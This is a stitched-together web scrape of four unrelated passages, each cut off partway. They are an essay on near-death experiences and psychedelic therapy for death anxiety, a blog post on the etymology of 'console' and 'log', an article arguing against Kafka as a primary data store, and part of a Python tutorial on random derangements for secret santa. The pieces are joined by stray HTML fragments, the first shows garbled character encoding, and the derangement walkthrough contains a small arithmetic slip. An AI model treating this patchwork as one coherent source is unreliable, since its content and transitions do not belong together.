<p>By not facing the issue of our mortality prior to our passing, we miss a unique opportunity, not only to reconcile with death and make peace with it, but also to gain a sense of levity and serenity that we can carry with us through our lives. But how can we overcome a fear of death thatâ€™s so deeply rooted in our culture?</p>
<p>Research is starting to reveal that certain states of consciousness can have a powerful and positive effect on how we perceive our own mortality. Thereâ€™s a strong association between a decreased fear of death and undergoing a near-death experience (NDE), out-of-body experience (OBE), lucid dream and psychedelic experience.</p>
<p>During an NDE, people report several features such as a transcendence of time and space, a life review, feelings that the experience is ineffable and authentic, encounters with deceased loved ones, and deep feelings of love and peace. One of the core transformative features of the NDE is an out-of-body experience, which is also associated with psychedelic experiences but, unlike these other states, is something that can be induced through training and intent.</p>
<p>One doesnâ€™t even need to have these experiences personally to benefit from them. A number of NDE researchers have noted profound changes in their own outlook following encounters with people who have had an NDE. As noted by one leading researcher, simply hearing or reading about NDEs can have a profound impact, acting as a â€˜benign virusâ€™. Research has <a href="https://www.tandfonline.com/doi/abs/10.1080/19349637.2016.1206844" rel="nofollow noreferrer noopener">revealed</a> that this can yield significant changes in peopleâ€™s spirituality and appreciation for both life and death.</p>
<p>The psychiatrist Elaine Drysdale, who works with terminally ill cancer patients in Canada, has heard countless reports of NDEs, and assures patients and their relatives that the experience of death itself isnâ€™t as painful or frightening as it might appear. She now teaches medical students and palliative care staff about the benefits of near-death research, and argues that NDEs allow us to approach the unknown and death without framing things in a religious way â€“ theyâ€™re inclusive, personal and occur in cultures all over the world.</p>
<p>An out-of-body experience can act as a motivating catalyst to further understand yourself</p>
<p>An OBE is a transpersonal experience where you feel your â€˜sense of selfâ€™ shift beyond your physical body, encountering beings and places that feel real. Unlike NDEs, OBEs can be induced willingly. This experience can also occur spontaneously in healthy people while theyâ€™re deeply relaxed, in hypnagogic states, on the cusp of sleep, and during meditation. Almost all OBEs have a positive impact, with experiencers commonly reporting a sense of serenity, mental clarity, awe and interconnectedness.</p>
<p>The experience can act as a motivating catalyst to further understand yourself, and is commonly associated with a reduced fear of death. As the American neuroscientist Sam Harris points out: â€˜whether or not a personâ€™s consciousness can actually be displaced is perhaps irrelevant; the point is it can <em>seem</em> to be.â€™ Distortion of embodiment can be disorientating, but disorientating to <em>whom</em>, if we experience that we arenâ€™t solely the totality of our body? One core feature <a href="https://pdfs.semanticscholar.org/4338/745de83065ca3c853a4d1695d76c1f65374b.pdf" rel="nofollow noreferrer noopener">linking</a> these various experiences is the feeling of transcending oneâ€™s primary identification with the physical body. The perspective-shifting power of this effect is supported by experiments <a href="https://journals.plos.org/plosone/article?id=10.1371/journal.pone.0169343" rel="nofollow noreferrer noopener">showing</a> that even a simulated OBE induced by immersive virtual reality can lessen death anxiety.</p>
<p><strong>The experience of transcending</strong> the physical body is frequently tied to feelings of connecting to something larger than oneself. This is usually associated with the experience of awe, an emotional state commonly linked to NDEs, OBEs and psychedelic experiences. Itâ€™s also experienced by astronauts when viewing the Earth from space, <a href="https://aeon.co/essays/psychedelics-can-have-the-same-overview-effect-as-a-space-journey" rel="noopener">referred</a> to as the â€˜overview effectâ€™. It conjures a cognitive shift of perceptual vastness, reframing oneâ€™s reality and place within it. This draws parallels with OBEs and NDEs, which appear to evoke a kind of â€˜outerview effectâ€™ when people glance back at their body and feel separate from it. This change of core identification from a limited body to a more expansive sense of self can radically curb existential anxiety.</p>
<p>These altered traits could be <a href="https://aeon.co/essays/religion-has-no-monopoly-on-transcendent-experience" rel="noopener">related</a> to ego-dissolution, which is another important experiential component of transcendent experiences. Such experiences are reliably catalysed by psychedelics and characterised by a loss of subjective self-identity; in essence, a simulated dying or death and rebirth experience. Following its dissolution, thereâ€™s a blurring of the perceived boundaries between self and other. Deep feelings of unity, awe and interconnection can stem from this. This experience is strongly associated with the mystical-type experiences that psychedelics can elicit and appears to be an important part of how psychedelics can alleviate death anxiety. Psychedelic therapy might also invoke a sense of ritual â€“ something that has largely been lost to Western culture, but is an important part of many Indigenous cultures, including those that employ psychedelic substances, such as psilocybin, shamanically.</p>
<p>â€˜If it helps them to die peacefully with their friends and family at their side, I donâ€™t care if itâ€™s real or an illusionâ€™</p>
<p>The evidence of the efficacy for psilocybin in treating existential angst is arguably the strongest of any yet obtained in the field of psychedelic research, following clinical studies conducted by the <a href="https://pubmed.ncbi.nlm.nih.gov/20819978/" rel="nofollow noreferrer noopener">University of California, Los Angeles</a>, <a href="https://www.ncbi.nlm.nih.gov/pmc/articles/PMC5367557/" rel="nofollow noreferrer noopener">Johns Hopkins University</a> in Baltimore and New York University (<a href="https://www.ncbi.nlm.nih.gov/pmc/articles/PMC5367551/" rel="nofollow noreferrer noopener">NYU</a>) exploring psilocybin as a treatment for existential anxiety in terminally ill cancer patients. Follow-up <a href="https://pubmed.ncbi.nlm.nih.gov/31916890/" rel="nofollow noreferrer noopener">research</a> by NYU found sustained reductions in death anxiety <span>4.5 years</span> after a single psilocybin session in the overwhelming majority of study participants. Psilocybin can also <a href="https://link.springer.com/article/10.1007%2Fs00213-011-2358-5" rel="nofollow noreferrer noopener">catalyse</a> feelings of death transcendence in those who arenâ€™t facing a terminal diagnosis. This is an unprecedented finding in the field of psychiatry.</p>
<p>In the words of Anthony <span>P Bossis,</span> a clinical assistant professor of psychiatry at the NYU School of Medicine and the former director of palliative care research for the NYU trial:</p>
<blockquote>While there have been advances in chemotherapies and pain management, there remains a paucity of therapies to address and relieve the emotional anguish experienced by the dying. The psychedelic therapy model represents a potential paradigm shift for the future of hospice and palliative care, providing a novel and effective therapy to relieve the emotional and spiritual distress so often experienced at the end of life. Not only can it offer emotional and spiritual healing for those facing their mortality, but it can also help their families who witness the relief of suffering in their loved one.</blockquote>
<p><strong>Another substance that reliably</strong> yields ego-dissolving transcendental experiences and might hold promise is ketamine. Numerous <a href="https://www.sciencedirect.com/science/article/abs/pii/S105381001830535X" rel="nofollow noreferrer noopener">studies</a> have found that the experiences it elicits are closest to the NDE, in phenomenological quality, of all substances examined. On the matter of authenticity of psychedelic insights, the veteran American psychedelic pharmacologist David Nichols had this to say: â€˜If it gives them peace, if it helps them to die peacefully with their friends and family at their side, I donâ€™t care if itâ€™s real or an illusion.â€™</p>
<p>The psychiatrist Stanislav Grof has likely supervised more psychedelic therapy sessions than anyone else alive. He treated terminally ill cancer patients with psychedelic therapy as part of his work with the Maryland Psychiatric Research Center. He observed patients describing these sessions as invaluable experiential training for dying, with some reporting NDEs as their disease progressed, which they described as yielding very similar states of consciousness. Grof commented that:</p>
<blockquote>â€˜dying before dyingâ€™ influences deeply the quality of life and the basic strategy of existence. It reduces irrational drives â€¦ and increases the ability to live in the present and to enjoy simple life activities. Another important consequence â€¦ is a radical opening to spirituality of a universal and non-denominational type.</blockquote>
<p>One thing reported in association with NDEs, OBEs, lucid dreams (dreams in which the dreamer is aware that theyâ€™re dreaming) and psychedelics (such as <a href="https://link.springer.com/article/10.1007/s00213-019-05446-2" rel="nofollow noreferrer noopener">ayahuasca</a>) is encountering deceased loved ones. Whether or not one takes the view such experiences are illusionary or â€˜realâ€™ in some sense doesnâ€™t take away from the therapeutic power of these encounters. The Holocaust survivor, financier and philanthropist George Sarlo had a life-changing <a href="https://www.jweekly.com/2020/07/16/psychedelic-journeys-brought-peace-to-this-holocaust-survivor-now-hes-helping-others-on-their-own-journeys/" rel="nofollow noreferrer noopener">encounter</a> with ayahuasca in his 70s, during which he had a conversation with his dead father who told him why he hadnâ€™t said goodbye before he was deported to a Nazi labour camp. In turn, feelings of depression that Sarlo had harboured for much of his life evaporated. Others report the resolution of relationship conflicts, feelings of relief, and a sense of closure after encountering a deceased relative. However, these extraordinary experiences arenâ€™t new, as Tibetan Buddhists have been wilfully inducing both OBEs and lucid …</p></div></div></div>

</code></pre></div><p>Even if you write <code>console.log</code> many times a day, you probably haven’t stopped to think about how the words ‘console’ and ‘log’ ended up in a programming language. Isn’t ‘console’ something you do when someone is upset? Isn’t a ‘log’ something you put on a fire?</p><p>Let’s take an etymological stroll through history and see what we can find. Our journey will take us from the early days of computing to medieval churches to the high seas, and we’ll learn that the seemingly unrelated definitions of these words have more in common than you might think.</p><h2 id="console">Console</h2><p>This is a JavaScript debugging console. It displays messages that help a programmer understand what’s happening in the code that’s being executed.</p><figure><img src="https://jshakespeare.com/post_images/js-console.gif" alt="A screenshot of the JavaScript debugging console in Google Chrome showing various logged messages"><figcaption><p>The JavaScript console in Google Chrome’s developer tools. Messages from <code>console.log</code> (or in the case of the red and yellow messages, <code>console.error</code> and <code>console.warn</code>) appear here</p></figcaption></figure><p>The concept of a debugging console is not unique to JavaScript. It’s a basic software interface common to many programming languages and applications. It provides a way for a program to output low-level textual information and, optionally, receive inputs for controlling the program.</p><figure><img src="https://jshakespeare.com/post_images/osx-console.gif" alt="A screenshot of the OSX Console application"><figcaption><p>The OSX Console application</p></figcaption></figure><p>The definition of console as a software feature comes from the early days of computing, when a user interacted with a computer mainframe (which was often very large and possibly located in another room or building) via an array of controls set in a desk.</p><figure><img src="https://jshakespeare.com/post_images/ibm7090.jpg" alt="A man in a white shirt pressing a button on a 1960's IBM computer console"><figcaption><p>A meteorologist at the console of the IBM 7090 electronic computer in the Joint Numerical Weather Prediction Unit in 1965.

Over time, consoles evolved to incorporate a command-line interface on a screen, with which the user would enter instructions using a keyboard.</p><p>We can find analogs of the computer console by looking to the world of music. Sound mixing consoles have existed in one form or another since the advent of electrical audio recording and broadcast almost a century ago.</p><p>But the use of the word console to describe a panel of electrical controls can be traced even further back, beyond the discovery of electricity itself, to the pipe organ.</p><figure><img src="https://jshakespeare.com/post_images/pipe-organ-ebrach-kirche.jpg" alt="Interior photograph of a church showing the pipe organ facade below a large stained glass window"><figcaption><p>The pipe organ facade in the former abbey church in Ebrach, Germany.

Organ consoles consist of keyboards (typically three to five), pedals, and stops - binary valves used for controlling wind flow to the pipes.</p><figure><img src="https://jshakespeare.com/post_images/organ-console.jpg" alt="A pipe organ console with console brackets"><figcaption><p>Image credit: <a href="https://commons.wikimedia.org/wiki/File:Usnaconsole.jpg">Wikimedia Commons</a></p></figcaption></figure><p>Organ consoles give us another everyday term: the idiom ‘pulling out all the stops’, meaning to apply maximum effort to a task. When every stop on the console is open an organ will produce sound using every available pipe, and therefore at maximum volume.</p><figure><img src="https://jshakespeare.com/post_images/cesar-franck.jpg" alt="Painting of composer and organist César Franck pulling out an organ stop"><figcaption><p>Composer César Franck pulling out a stop at the console of the organ at St. Clotilde Basilica, Paris, 1885. Image credit: <a href="https://commons.wikimedia.org/wiki/File:Cesar_Franck_At_Organ.jpg">Wikimedia Commons</a></p></figcaption></figure><p>But where did this type of console get its name? One clue lies in the fact that many organ consoles share a design feature with the console table. Modern console tables are typically four-legged, free-standing structures designed to abut a wall. But if we go back a few centuries, we find that console tables were more commonly wall-mounted with brackets beneath the table surface to bear the load.</p><figure><img src="https://jshakespeare.com/post_images/console-table.jpg" alt="Marble and gilt oak console table with decoratively carved supporting brackets"><figcaption><p>French Regency console table from the Metropolitan Museum of Art collection in New York. Image credit: <a href="https://commons.wikimedia.org/wiki/File:Console_table_MET_DP268329.jpg">Wikimedia Commons</a></p></figcaption></figure><p>These supporting brackets are where the console table, (and perhaps the organ console) gets its name. In architecture, a console refers to an ornamental bracket that supports a protruding structure, such as a ledge, cornice, or balcony.</p><figure><img src="https://jshakespeare.com/post_images/console-architecture.jpg" alt="A neoclassical stone console supporting a balcony"><figcaption><p>Neoclassical stone console supporting a balcony at the Maison médicale de l'Œuvre du calvaire in Brussels. Image credit: <a href="https://commons.wikimedia.org/wiki/File:Fa%C3%A7adebalconconsolechausseewavreneoclassique.jpg">Wikimedia Commons</a></p></figcaption></figure><p>At this point, our etymological path forks. An architectural console may get its name from the verb ‘to console’: literally <em>con solaris</em> or ‘with soothing’; a relieving of pain or, perhaps, of weight. You could consider the job of a console to ‘relieve’ the weight of the structure above it.</p><p>An alternative explanation takes us back to the church, where in medieval times choir stalls were decorated with carved male figures called <em>consolateurs</em> or ‘consolers’. This in itself may have been a pun on the fact that consolers were often carved into armrests, thus supporting the weight of a seated chorist’s arms.</p><figure><img src="https://jshakespeare.com/post_images/choir-stall.jpg" alt="Illustration of wooden choir stalls showing carved consoles in the arm rests"><figcaption><p>Illustration showing the carved wooden <em>consolateurs</em> in the armrests of the choir stalls at Andlau Abbey in Alsace, France. Image credit: <a href="https://commons.wikimedia.org/wiki/File:Stalles.eglise.Anellau.png">Wikimedia Commons</a></p></figcaption></figure><p>So, far from being coincidental homonyms, it turns out that the many definitions of ‘console’ share a common etymological root, even when it’s used as a verb. Does the same go for ‘log’?</p><h2 id="log">Log</h2><p>In computing, the term ‘log’ derives from a ship’s log, which is short for ‘logbook’. A logbook is used for recording information about any event taking place aboard a vessel, from navigation to maintenance to changes in crew. While there are typically no restrictions about what can be recorded in a logbook, the name comes from a very specific use: recording the ship’s speed.</p><p>Long before the invention of modern instruments, such as GPS, recording speed was an essential part of navigating the seas. Sailors would measure their speed and record it in the logbook every half hour, and by knowing how fast they were going, combined with the direction in which they were traveling (measured using a compass), they could work out where they were on the map.</p><figure><img src="https://jshakespeare.com/post_images/ships-logbook.jpg" alt="Ships logbook showing handwritten entries"><figcaption><p>Logbook from the USS Savannah with entries from September 3-15, 1943. Image credit: <a href="https://commons.wikimedia.org/wiki/File:19430903-19430915_USS_Savannah_CL-42_Turret_Two_log_book_entries.jpg">Wikimedia Commons</a></p></figcaption></figure><p>The logbook got its name from the chip log, a device that sailors used to measure the ship’s speed. This consisted of a quarter-circle piece of wood (the ‘chip’) with a rope tied to it, in which knots were tied at regular intervals.</p><figure><img src="https://jshakespeare.com/post_images/chip-log.jpg" alt="Chip log"><figcaption><p>19th century chip log. Image credit: <a href="https://en.wikipedia.org/wiki/File:Loch_%C3%A0_plateau.jpg">Wikimedia Commons</a></p></figcaption></figure><p>A sailor would throw the chip overboard and count how many knots spooled out while another sailor timed him using a sand timer. When the timer was up, the number of knots that had passed over the stern could be used to calculate the ship’s speed, which was then recorded in the logbook. This is where we get the term ‘knot’ as shorthand for 1 nautical mile per hour.</p><figure><img src="https://jshakespeare.com/post_images/chip-log-engraving.jpg" alt="An engraving of three mates measuring a ship’s speed using a chip log"></figure><p>Before the invention of the chip log, an even more rudimentary technique for gauging speed was the Dutchman’s log. One sailor would throw any floating object (probably an actual log) over the bow of the ship while another sailor on the stern timed how long it took for the object to pass him. With this measurement (and knowing the length of the ship), the sailors could make a rough estimate of how fast they were travelling.</p><p>The days of using a log to measure a ship’s speed lie centuries behind us, but ‘log’ is a ubiquitous term in modern life thanks to its importance in computing (just think how many times you ‘log in’ to various pieces of software every day). And it’s just one of many modern definitions whose origins lie in our civilization’s long maritime history. We don’t need to look far to find more: the word ‘cyber’ derives from the ancient Greek word <em>kubernētēs</em>, meaning steersman or rudder, and the word ‘gadget’ was a slang term used by sailors for any part of a ship that they couldn’t remember the correct name of.</p><p>So next time you write <code>console.log</code> in your editor, spare a thought for the computer pioneers, pipe organists, medieval carvers, and old-word mariners who played a small part in giving us the very modern definitions of these two words.</p><hr><p><em>If you enjoyed this, you may want to read <a href="https://jshakespeare.com/your-creations-will-not-outlast-you/">Your creations will not outlast you</a>.</em></p></div></article></main></div></div></div>]]>

<p>It’s important to understand the uses and abuses of streaming infrastructure.</p>
<p>Apache Kafka is a message broker that has rapidly grown in popularity in the last few years. Message brokers have been around for a long time; they’re a type of datastore specialized for “buffering” messages between producer and consumer systems. Kafka has become popular because it’s open-source and capable of scaling to very large numbers of messages.</p>
<p>Message brokers are classically used to decouple producers and consumers of data. For example, at Fivetran, we use a message broker similar to Kafka to buffer customer-generated webhooks before loading them in batches into your data warehouse:</p>
<p><img src="https://materialize.com/wp-content/uploads/2020/12/kafka_overview.png" data-src="https://materialize.com/wp-content/uploads/2020/12/kafka_overview.png" alt="A Message Broker Used as a buffer before loading into a data warehouse" width="960" height="124" data-srcset="https://materialize.com/wp-content/uploads/2020/12/kafka_overview.png 960w, https://materialize.com/wp-content/uploads/2020/12/kafka_overview-300x39.png 300w, https://materialize.com/wp-content/uploads/2020/12/kafka_overview-768x99.png 768w" data-sizes="(max-width: 960px) 100vw, 960px" srcset="https://materialize.com/wp-content/uploads/2020/12/kafka_overview.png 960w, https://materialize.com/wp-content/uploads/2020/12/kafka_overview-300x39.png 300w, https://materialize.com/wp-content/uploads/2020/12/kafka_overview-768x99.png 768w"></p>
<p>In this scenario, the message broker is providing durable storage of events between when a customer sends them, and when Fivetran loads them into the data warehouse.</p>
<p>However, Kafka has occasionally been described as something much more than just a better message broker. Proponents of this viewpoint position Kafka as a fundamentally new way of managing data, where <a href="https://www.confluent.io/blog/okay-store-data-apache-kafka/" target="_blank" rel="noopener noreferrer">Kafka replaces the relational database as the definitive record of what has happened</a>. Instead of reading and writing a traditional database, you append events to Kafka, and read from downstream views that represent the present state. This architecture has been described as “<a href="https://www.confluent.io/blog/turning-the-database-inside-out-with-apache-samza/" target="_blank" rel="noopener noreferrer">turning the database inside out</a>“.</p>
<p>In principle, it is possible to implement this architecture in a way that supports both reads and writes. However, during that process you will eventually confront every hard problem that database management systems have faced for decades. You will more or less have to write a full-fledged DBMS in your application code. And you will probably not do a great job, because databases take years to get right. You will have to deal with dirty reads, phantom reads, write skew, and all the other symptoms of a hastily implemented database.</p>

<p>The fundamental problem with using Kafka as your primary data store is it provides no isolation. Isolation means that, globally, all transactions (reads and writes) occur along some consistent history. Jepsen provides a <a href="https://jepsen.io/consistency">guide</a> of isolation levels (inhabiting an isolation level means that the system will never encounter certain anomalies).</p>
<p>Let’s consider a simple example of why isolation is important: suppose we’re running an online store. When a user checks out, we want to make sure all their items are actually in stock. The way to do this is to</p>
<ol>
<li>Check the inventory level for each item in the user’s cart.</li>
<li>If an item is no longer available, abort the checkout.</li>
<li>If all items are available, subtract them from the inventory and confirm the checkout.</li>
</ol>
<p>Suppose we are using Kafka to manage this process. Our architecture might look something like this:</p>
<p><img src="https://materialize.com/wp-content/uploads/2020/12/kafka_checkout.png" data-src="https://materialize.com/wp-content/uploads/2020/12/kafka_checkout.png" alt="A microservice workflow for processing checkouts" width="960" height="753" data-srcset="https://materialize.com/wp-content/uploads/2020/12/kafka_checkout.png 960w, https://materialize.com/wp-content/uploads/2020/12/kafka_checkout-300x235.png 300w, https://materialize.com/wp-content/uploads/2020/12/kafka_checkout-768x602.png 768w" data-sizes="(max-width: 960px) 100vw, 960px" srcset="https://materialize.com/wp-content/uploads/2020/12/kafka_checkout.png 960w, https://materialize.com/wp-content/uploads/2020/12/kafka_checkout-300x235.png 300w, https://materialize.com/wp-content/uploads/2020/12/kafka_checkout-768x602.png 768w"></p>
<p>The web server reads the inventory level from a view downstream from Kafka, but it can only commit the transaction <em>upstream</em> in the checkouts topic. The problem is one of <strong>concurrency control</strong>: if there are two users racing to buy the last item, <em>only one must succeed</em>. We need to read the inventory view and confirm the checkout at <em>a single point in time</em>. However, there is no way to do this in this architecture.</p>
<p>The problem we now have is called <a href="http://justinjaffray.com/what-does-write-skew-look-like/">write skew</a>. Our reads from the inventory view can be out of date by the time the checkout event is processed. If two users try to buy the same item at nearly the same time, they will both succeed, and we won’t have enough inventory for them both.</p>
<p>Event-sourced architectures like these suffer many such isolation anomalies, which constantly gaslight users with “time travel” behavior that <a href="https://www.google.com/search?q=facebook+unread+notification+glitch">we’re all familiar with</a>. Even worse, research shows that anomaly-permitting architectures create outright security holes that allow hackers to steal data, as covered in <a href="https://www.cockroachlabs.com/blog/acid-rain/">this excellent blog post</a> on <a href="http://www.bailis.org/papers/acidrain-sigmod2017.pdf">this research paper.</a></p>

<p>These problems can be avoided if you use Kafka as a <em>complement</em> to a traditional database:</p>
<p><img src="https://materialize.com/wp-content/uploads/2020/12/kafka_oltp_flow.png" data-src="https://materialize.com/wp-content/uploads/2020/12/kafka_oltp_flow.png" alt="kafka used for Change Data Capture from an OLTP database" width="960" height="658" data-srcset="https://materialize.com/wp-content/uploads/2020/12/kafka_oltp_flow.png 960w, https://materialize.com/wp-content/uploads/2020/12/kafka_oltp_flow-300x206.png 300w, https://materialize.com/wp-content/uploads/2020/12/kafka_oltp_flow-768x526.png 768w" data-sizes="(max-width: 960px) 100vw, 960px" srcset="https://materialize.com/wp-content/uploads/2020/12/kafka_oltp_flow.png 960w, https://materialize.com/wp-content/uploads/2020/12/kafka_oltp_flow-300x206.png 300w, https://materialize.com/wp-content/uploads/2020/12/kafka_oltp_flow-768x526.png 768w"></p>
<p>OLTP databases perform a crucial task that message brokers are not well suited to provide: admission control of events. Rather than using a message broker as a receptacle for “fire and forget” events, forcing your event schema into an “intent pattern”, an OLTP database can <em>deny</em> events that conflict, ensuring that only a single consistent stream of events are ever emitted. OLTP databases are really good at this core <strong>concurrency control</strong> task – scaling to many millions of transactions per second.</p>
<p>Using a database as the point-of-entry for writes, the best way to extract events from a database is via streaming <strong>change-data-capture</strong>. There are several great open CDC frameworks like <a href="http://debezium.io/">Debezium</a> and <a href="http://maxwells-daemon.io/">Maxwell</a>, as well as native CDC from <a href="https://www.cockroachlabs.com/docs/stable/change-data-capture.html">modern</a> <a href="https://docs.oracle.com/cd/B28359_01/server.111/b28313/cdc.htm">SQL</a> <a href="https://docs.yugabyte.com/latest/architecture/docdb-replication/change-data-capture/">databases</a>. Change-data-capture also sets up an elegant operational story. In recovery scenarios, everything can be purged downstream and rebuilt from the (very durable) OLTP database.</p>

<p>The database community has learned (and re-learned) several important lessons over decades. Each one of these lessons was obtained at the high prices of data corruption, data loss, and numerous user-facing anomalies. The last thing you want to do is to find yourself relearning these lessons because you <a href="https://www.oreilly.com/library/view/strata-hadoop/9781491944608/video244677.html">accidentally misbuilt a database</a>.</p>
<p>Real-time streaming message brokers are a great tool for managing high-velocity data. But you will still need a traditional DBMS for isolating transactions. The best reference architecture for “turning your database inside out” is to use OLTP databases for admission control, use CDC for event generation, and model downstream copies of the data as materialized views.</p>

<blockquote>
[A]lmost as many algorithms have been published for unsorting as for sorting!
</blockquote>
<p>
— Donald Knuth
</p>
</div>
<p>We’ll use Python to explore some algorithms for generating random derangements.
The functions given below are sometimes simplified to get the main ideas across; the complete versions can be found in <a href="https://github.com/cristoper/sinterbot/blob/master/sinterbot/algorithms.py">alogrithms.py in the github repository</a>.
To keep things simple, all of the functions operate only on permutations of the set of integers from 0 to n-1. If we’d like to permute a set of some other n objects (like santas) we can then use those integers as indexes into the list of our other objects.</p>
<div>
<h3 id="_utilities">Utilities</h3>
<p>There are a few utility functions that we might want while exploring and debugging our algorithms. First of all, the ability to calculate \(D_n\), the number of derangements in a set of size \(n\). Here is a straightforward translation of \(\eqref{eq:dn}\) to Python:</p>
<div>
<p>Dn()</p>
<div>
<pre><code data-lang="python"><span>import</span> <span>math</span>
<span>from</span> <span>decimal</span> <span>import</span> <span>Decimal</span>

<span>def</span> <span>Dn</span>(n: <span>int</span>):
    
    
    
    s = <span>0</span>
    <span>for</span> k <span>in</span> <span>range</span>(n+<span>1</span>):
        s += (-<span>1</span>)**k/Decimal(math.factorial(k))
    result = math.factorial(n) * s
    <span>return</span> Decimal.to_integral_exact(result)

[<span>int</span>(Dn(i)) <span>for</span> i <span>in</span> <span>range</span>(<span>9</span>)]
&gt;&gt; [<span>1</span>, <span>0</span>, <span>1</span>, <span>2</span>, <span>9</span>, <span>44</span>, <span>265</span>, <span>1854</span>, <span>14833</span>]</code></pre>
</div>
</div>
<p>Next up is a way to generate all \(n!\) permutations of a set.
Several algorithms for generating permutations are well-known. Most classic is an algorithm which produces permutations in lexicographical order described by Knuth in <a href="http://www.cs.utsa.edu/~wagner/knuth/fasc2b.pdf">7.2.1.2 Algorithm L</a>. Other techniques produce all permutations by only swapping one pair of elements at a time (see the <a href="https://en.wikipedia.org/wiki/Steinhaus%E2%80%93Johnson%E2%80%93Trotter_algorithm">Steinhaus-Johnson-Trotter algorithm</a> which Knuth gives as Algorithm P).</p>
<p>But in our case the Python standard library provides a function for generating permutations (in lexicographical order) so we’ll just use that:</p>
<div>
<div>
<pre><code data-lang="python"><span>import</span> <span>itertools</span>
<span>list</span>(itertools.permutations([<span>0</span>,<span>1</span>,<span>2</span>]))

&gt;&gt; [(<span>0</span>, <span>1</span>, <span>2</span>), (<span>0</span>, <span>2</span>, <span>1</span>), (<span>1</span>, <span>0</span>, <span>2</span>), (<span>1</span>, <span>2</span>, <span>0</span>), (<span>2</span>, <span>0</span>, <span>1</span>), (<span>2</span>, <span>1</span>, <span>0</span>)]</code></pre>
</div>
</div>
<p>Another helpful function would be a way to decompose permutations into their cycles to make them easier to visualize (taking \((0, 1, 2,\cdots, n-1)\) to be the identity permutation).
To find the cycles in a permutation, start with the first element and then visit the element it points to (the element in its position in the identity permutation), and then visit the element that one points to and so on until we get back to the first element. That completes a cycle containing each of the elements visited, add it to a list. Now start over with the first unvisited element. Repeat until there are no more unvisited elements.</p>
<p>Below is an implementation of that algorithm.
It requires storage for the list of cycles (the <code>cycles</code> variable), a way to keep track of unvisited elements (the <code>unvisited</code> variable, which starts as a copy of the input but has elements removed as they are visited), and a way to keep track of the first element in a cycle so that we know when we’ve returned to it (the variable called <code>first</code> below):</p>
<div>
<p>decompose()</p>
<div>
<pre><code data-lang="python"><span>def</span> <span>decompose</span>(perm):
    cycles = []
    unvisited = <span>list</span>(perm)

    <span>while</span> <span>len</span>(unvisited):
        first = unvisited.pop(<span>0</span>)
        cur = [first]
        nextval = perm[first]
        <span>while</span> nextval != first:
            cur.append(nextval)
            
            
            unvisited.pop(unvisited.index(nextval))
            nextval = perm[nextval]
        cycles.append(cur)

    <span>return</span> cycles</code></pre>
</div>
</div>
<p>As an example, let’s see the cycles in \(\{1, 2, 4, 3, 0\}\mathrm{:}\)</p>
<div>
<div>
<pre><code data-lang="python">decompose([<span>1</span>,<span>2</span>,<span>4</span>,<span>3</span>,<span>0</span>])

&gt;&gt; [[<span>1</span>, <span>2</span>, <span>4</span>, <span>0</span>], [<span>3</span>]]</code></pre>
</div>
</div>
<p>Notice this agrees with the same cycles we found way back in our first example of a permutation (where \(\mathrm{S}=0, \mathrm{C}=1, \mathrm{A}=2, \mathrm{L}=3, \mathrm{M}=4\)) \(\eqref{eq:perm}\).</p>
<p>Finally, it will be handy to have a function that can test whether a permutation is a derangement or not.
One way to do that would be to call <code>decompose()</code> on the permutation and then check if there are any 1-cycles in the decomposition.
The nice thing about that method is that it generalizes so we could use it to check if the permutation contains any cycles \(\leq m\) for any \(m\).</p>
<p>But if we only care about derangements (the case where \(m=1\)), it is simpler (and faster) to just iterate over the elements of the permutation and check if they are in their original position. If any are, we can immediately return <code>False</code>, the permutation is not a derangement.</p>
<div>
<p>check_deranged()</p>
<div>
<pre><code data-lang="python"><span>def</span> <span>check_deranged</span>(perm):
    <span>for</span> i, el <span>in</span> <span>enumerate</span>(perm):
        <span>if</span> el == i: <span>return</span> <span>False</span>
    <span>return</span> <span>True</span>


check_deranged([<span>1</span>,<span>2</span>,<span>4</span>,<span>3</span>,<span>0</span>])
&gt;&gt; <span>False</span>

decompose([<span>1</span>,<span>3</span>,<span>4</span>,<span>2</span>,<span>0</span>])
&gt;&gt; [[<span>1</span>, <span>3</span>, <span>2</span>, <span>4</span>, <span>0</span>]] 

check_deranged([<span>1</span>,<span>3</span>,<span>4</span>,<span>2</span>,<span>0</span>])
&gt;&gt; <span>True</span></code></pre>
</div>
</div>
</div>
<div>
<h3 id="_how_not_to_generate_derangements">How not to generate derangements</h3>
<p>The first time I sat down to write a secret santa algorithm, my instinct was to try a <a href="https://en.wikipedia.org/wiki/Backtracking">backtracking</a> approach and ended up with something like the code below. The idea behind the backtracker is to iteratively build a derangement by randomly selecting an element from the identity arrangement, and then checking if the resulting partial permutation is a derangement. If it is not a derangement, undo (backtrack) the last choice and try again. If it is a derangement, randomly choose one of the remaining elements and check again. Repeat until you’ve deranged all \(n\) elements:</p>
<div>
<p>backtracker()</p>
<div>
<pre><code data-lang="python"><span>import</span> <span>random</span>
<span>def</span> <span>backtracker</span>(n):
    <span>if</span> n == <span>0</span>: <span>return</span> []
    remaining = <span>list</span>(<span>range</span>(n))
    perm = []

    
    <span>while</span> <span>len</span>(perm) &lt; n:
        perm.append(random.choice(remaining))
        <span>if</span> <span>not</span> check_deranged(perm):
            <span>if</span> <span>len</span>(remaining) == <span>1</span>:
                
                
                perm[-<span>1</span>], perm[-<span>2</span>] = perm[-<span>2</span>], perm[-<span>1</span>]
                <span>return</span> perm
            
            perm.pop(-<span>1</span>)
        <span>else</span>:
            remaining.remove(perm[-<span>1</span>])
    <span>return</span> perm


perm = backtracker(<span>5</span>)
perm, decompose(perm)
&gt;&gt; ([<span>1</span>, <span>2</span>, <span>0</span>, <span>4</span>, <span>3</span>], [[<span>1</span>, <span>2</span>, <span>0</span>], [<span>4</span>, <span>3</span>]])</code></pre>
</div>
</div>
<p>As written, <code>backtracker()</code> is fast and will produce any possible derangement (and in only ~20 lines of Python), so it <em>could</em> be used for secret santa. However, as the decades fly by your friends might begin to suspect that the same assignments seem to be ‘randomly’ generated fairly often.
They would be right: <code>backtracker()</code> does not produce derangements with uniform probability.
Even though each element in the derangement is chosen from the remaining elements of the input set with uniform probability, the number of possible derangements is dependant on which numbers happen to have been chosen first.</p>
<p>For example, let’s look at the probability that <code>backtracker()</code> will produce \((5, 0, 1, 2, 3, 4).\)
The first number can be anything but 0, so there are \(6-1=5\) ways to choose that.
The second number can be any of the remaining 5 numbers except 1, so there are 4 ways to choose that.
The third number can be any of the remaining 4 numbers except 2 which leaves 3 possibilities.
The fourth element can be any of the remaining numbers except for 2 which leaves 2 possibilities.
The fifth element can not be 4, so there is only one way to derange the last two elements.
If we take the product of those probabilities we get \(\frac{1}{5} \cdot \frac{1}{4} \cdot \frac{1}{3} \cdot \frac{1}{2} = \frac{1}{120}.\)</p>
